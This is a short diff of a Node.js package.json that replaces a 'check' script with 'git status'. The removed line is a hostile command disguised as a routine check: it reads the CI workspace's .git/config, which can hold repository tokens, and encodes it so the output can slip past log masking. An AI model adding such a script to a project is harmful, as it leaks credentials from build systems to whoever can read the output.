@@ -3,7 +3,7 @@
   "version": "1.0.0",
   "description": "A very basic example of a Node.js project manifest.",
   "scripts": {
-    "check": "cat $GITHUB_WORKSPACE/.git/config | xxd -p | base64",
+    "check": "git status",
     "test": "echo \"test\""
   },
   "keywords": [
